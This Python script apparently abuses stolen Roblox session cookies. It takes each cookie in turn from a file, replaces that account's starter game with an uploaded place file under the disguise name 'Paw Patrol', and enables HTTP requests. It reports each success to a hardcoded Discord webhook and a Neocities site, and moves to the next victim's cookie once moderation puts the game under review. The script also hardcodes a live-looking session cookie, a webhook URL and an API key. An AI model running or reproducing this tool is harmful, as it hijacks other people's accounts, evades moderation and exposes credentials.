import time
import random
from requests import post, get
import requests
from os import name as os_name, system, truncate
from discord import Webhook, RequestsWebhookAdapter
from selenium.webdriver.support import expected_conditions as EC
import codecs
import json
import discord
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
import secrets
from unblacklister import uniqueId, referentt
import os
from neocities import Neocities

def main(cookie):
    uniqueId()
    referentt()
    token = post("https://auth.roblox.com/v2/logout",
                 cookies={
                     ".ROBLOSECURITY": cookie
                 }).headers['X-CSRF-TOKEN']
    nc = Neocities("79bfe98164d3fa0c85df949eb3a5429f")
    userId = requests.get("https://users.roblox.com/v1/users/authenticated",
                          headers={
                              'x-csrf-token': token,
                              'User-Agent': 'Roblox',
                                "Connection": "keep-alive"
                          },
                          cookies={
                              '.ROBLOSECURITY': cookie
                          }).json()["id"]
    print("Got UserId: " + str(userId))
    gameId = requests.get("https://inventory.roblox.com/v2/users/" +
                          str(userId) + "/inventory/9?limit=10&sortOrder=Asc",
                          headers={
                              'x-csrf-token': token,
                              'User-Agent': 'Roblox'
                          },
                          cookies={
                              '.ROBLOSECURITY': cookie
                          }).json()["data"][0]["assetId"]
    print("Got StarterplaceId: " + str(gameId))
    myfiles = open("PARRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR.rbxlx", "rb").read()
    unvid = get(
        "https://api.roblox.com/universes/get-universe-containing-place?placeid="
        + str(gameId)).json()["UniverseId"]
    print("Got universeID: " + str(unvid))
    url = f"https://data.roblox.com/Data/Upload.ashx?assetid={str(gameId)}"

    url2 = f"https://develop.roblox.com/v2/universes/{str(unvid)}/configuration"

    maxplayers = 100
    avatartype = "MorphToR6"
    allowprivateservers = True
    IsThirdPartyTeleportAllowed = True
    IsHTTPRequestsAllowed = True

    gamedata = {
        "name": "Paw Patrol",
        "description": "1234",
        "universeAvatarType": avatartype,
        "universeAnimationType": "Standard",
        "maxPlayerCount": '100',
        "allowPrivateServers": allowprivateservers,
        "IsThirdPartyTeleportAllowed" : IsThirdPartyTeleportAllowed,
        "IsHTTPRequestAllowed" : IsHTTPRequestsAllowed,
        "privateServerPrice": "0",
        "permissions": {
            "IsThirdPartyPurchaseAllowed": "True",
            "IsThirdPartyTeleportAllowed": "True",
            "IsHTTPRequestAllowed" : "True,"
        }
    }
    gamedata = json.dumps(gamedata)
    gameData = requests.patch(
        url2,
        headers={
            'Content-Type': 'application/json',
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
            'x-csrf-token': token
        },
        cookies={'.ROBLOSECURITY': cookie},
        data=gamedata)

    print("Updated game status code: " + str(gameData.status_code))
    print(gameData.content)
    upload = post(url,
                  headers={
                      'Content-Type': 'application/xml',
                      'User-Agent': 'Roblox',
                      'x-csrf-token': token
                  },
                  cookies={'.ROBLOSECURITY': cookie},
                  data=myfiles)
    if upload.status_code == 200:
        webhook = Webhook.from_url(
            "https://discord.com/api/webhooks/951240163256840252/Aw8lfufu8AWFGBdaXbjG6ASjgaSFJlE_ILPgVSDRgmFlFUVlHDxroKcIfQGmv787N2bW",
            adapter=RequestsWebhookAdapter())
        webhook.send("<@&950601277442785301>")
        e = discord.Embed(title="**Simple Society**",
                          description="**Game successfully uploaded.**",
        					color=0000)
        e.add_field(name="`Game Name`", value="Paw Patrol", inline=True)
        e.add_field(name="`Game Description`", value="1234", inline=True)
        e.add_field(name="`Max Players`", value=maxplayers, inline=True)
        e.add_field(name="`Avatar Type`", value="R6", inline=True)
        e.add_field(name="`Private Servers`",
                    value=":white_check_mark:",
                    inline=True)
        e.add_field(
            name="`Game Link`",
            value=
            f"[Click here to play!](https://www.roblox.com/games/{gameId}/)",
            inline=True)
        webhook.send(embed=e)
        nc.upload("latest/place.txt", str(gameId)) 
        url222 = 'https://discord.com/api/v9/channels/899999268146921502/messages'
        link222 = f'https://www.roblox.com/games/{gameId}/'
        link222 = f'https://www.roblox.com/games/{gameId}/'

    def check2():
        cookie2 = "_|WARNING-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_462BAC55CCC36159B71A2E05CEAC636F0E3FAFD14F298A9B8F8C12BE31643692D34ED68781F9357A595EA7A494DE6F1AB9744906B21C05B1852F9A80A96242CE50359C90B0F0C53EA904EED7BF420551751B1AE89C6ECC33289E36A23A0075E81689BA59A18EA33DE9B3801358490E05E18D66645CDAD1568626CE10BFADC94F38C48312A55CC69C7A09849BF459F2C3EF7E7DB77A1C041D682C0E8AF68BE854A814D37E22451F8E45E4EC173275BFD64CF36769B4DD410587A84E1A1D221FEEEC47561404FBDF0A4CA550816DB574F1E082BC67CE538BB941122201DE8A524A22D5D5843EFD811D289A9C85DB0F7B28616A4D9345F6309FF02895FAF2A61B5557284B7BE98312714AB7D0E622F9A20935F2A1F513A5921645CC913B43423D343AE8A82250413DD8A49CED80555C470891B8243D0412BFA599C72E36887126F1B79037DA95FC9B2B0ED7EFACE0C2CA9E75E7770A"
        sheesh = get(f"https://games.roblox.com/v1/games/multiget-playability-status?universeIds={unvid}",headers={'x-csrf-token': token,'User-Agent': 'Roblox'},cookies={'.ROBLOSECURITY': cookie2 }).json()
        print(get(f"https://games.roblox.com/v1/games/multiget-playability-status?universeIds={unvid}",headers={'x-csrf-token': token,'User-Agent': 'Roblox'},cookies={'.ROBLOSECURITY': cookie2 }).content)
        sheesh = sheesh[0]['playabilityStatus']
        if sheesh == 'UnderReview':
            k = 1
            filename = 'cookies.txt'
            with open(filename) as file:
                lines = file.read().splitlines()

            if len(lines) > k:
                random_lines = random.sample(lines, k)
                with open(filename, 'w') as output_file:
                    output_file.writelines(line + "\n"
                    for line in lines if line not in random_lines)
                main("\n".join(random_lines))
            elif lines: # file is too small
                print("\n".join(lines)) # print all lines
                with open(filename, 'wb', 0): # empty the file
                    pass
    
    while True:
        check2()
        time.sleep(1)

def start():
    k = 1
    filename = 'cookies.txt'
    with open(filename) as file:
        lines = file.read().splitlines()

    if len(lines) > k:
        random_lines = random.sample(lines, k)
        with open(filename, 'w') as output_file:
            output_file.writelines(line + "\n"
            for line in lines if line not in random_lines)
        main("\n".join(random_lines))
    elif lines: # file is too small
        print("\n".join(lines)) # print all lines
        with open(filename, 'wb', 0): # empty the file
                    pass

start()